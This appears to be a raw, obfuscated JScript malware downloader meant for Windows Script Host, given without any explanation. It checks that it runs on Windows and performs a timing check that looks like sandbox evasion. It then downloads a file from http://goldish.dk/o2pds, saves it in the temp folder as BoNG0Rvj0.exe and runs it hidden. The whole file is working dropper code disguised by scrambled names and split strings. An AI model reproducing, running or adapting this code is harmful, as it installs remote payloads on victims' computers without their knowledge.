var _EN = false;
var _V = "CreateObject";
var _CN = function _HZ() {return WScript[_V]("WScript"+".Shell");}(), _Y0 = 11;
var _Y = "MSXML2.XMLHTTP";
var _WZ = 2123213;
var _PG = 0;
function _HI(_YR){_CN["Run"](_YR, _PG, _PG);};
function _BG(){return _Y + "";};
function _C(_G, _U0){_PG = _PG * 1; return _G - _U0;};
function _DB(){return _V;};
/*@cc_on
  @if (@_win32 || @_win64)
    _EN = true;
  @end
@*/
if (_EN)
{
var _JK = "";
function _UH(){return 22;};
var _II = 0; var _UN = 0;
function _B()
{
var _CI = new this["Date"]();
var _O = _CI["getUTCMilliseconds"]();
WScript["Sleep"](_UH());
var _CI = new this["Date"]();
var _U = _CI["getUTCMilliseconds"]();
WScript["Sleep"](_UH());
var _CI = new this["Date"]();
var _UX = _CI["getUTCMilliseconds"]();
var _II = "_OA";
_II = _C(_U, _O);
var _UN = "_J";
_UN = _C(_UX, _U);
_JK = "open";
return _C(_II, _UN);
}
var _J0 = false;
var _N = false;
for (var _R = _PG; _R < _UH() * 1; _R++){if (_B() != _PG){
_J0 = true; 
_UN = "31" + 11 * _II + _UN; 
_N = true; 
break;
}}
function _D() {return ((_J0 == true) && (_J0 == _N)) ? 1 : _PG;};
if (_J0 && _D() && _N){
function _CY() {return _CN["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "BoNG0Rvj0.ex" + "e";};
 _IC = _BG();
 _BM = WScript[_V](_IC);
 var _E = 1;
 while (_E){
try {
	if (_E == 1)
	{
		_BM[_JK]("GET", "http://goldish.dk/o2pds", false);
		_BM["send"]();
		_QF = "Sleep";
	}
	WScript[_QF](_UH() + 120); 
	if (_BM["readystate"] < 2 * 2) continue;
	_E = _PG;
	function _CR(_W) {var _D0 = (1, 2, 3, 4, 5, _W); return _D0;};
	_EB = WScript[_DB()]("ADODB.Stream");
	_IC = _EB;
	_IC[_JK]();
	_IC["type"] = _CR(1);
	_IC["write"](_BM["ResponseBody"]);
	_EB["position"] = _CR(_PG);
	_IC["Save" + "ToFile"](_CY(), 2);
	_EB["cl"+"ose"]();
	_X = _CY();
	_HI(_X);
} catch(_UR){};
}
}
}

